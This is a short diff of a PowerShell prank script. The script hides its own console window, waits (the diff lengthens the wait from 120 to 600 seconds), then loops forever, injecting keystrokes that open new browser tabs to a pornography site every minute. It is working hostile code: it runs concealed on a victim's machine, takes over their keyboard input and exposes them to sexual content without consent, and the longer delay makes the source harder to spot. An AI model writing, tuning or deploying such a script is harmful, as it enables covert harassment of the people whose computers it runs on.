@@ -9,6 +9,6 @@ public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
 $consolePtr = [Console.Window]::GetConsoleWindow()
 [Console.Window]::ShowWindow($consolePtr, 0)
 
-sleep 120
+sleep 600
 
 $wshell = New-Object -ComObject wscript.shell;while (1) {$wshell.sendKeys("{ESC}");sleep 1;$wshell.sendKeys("^t");sleep 1;$wshell.sendKeys("pornhub.com/model/belledelphine~");sleep 60}
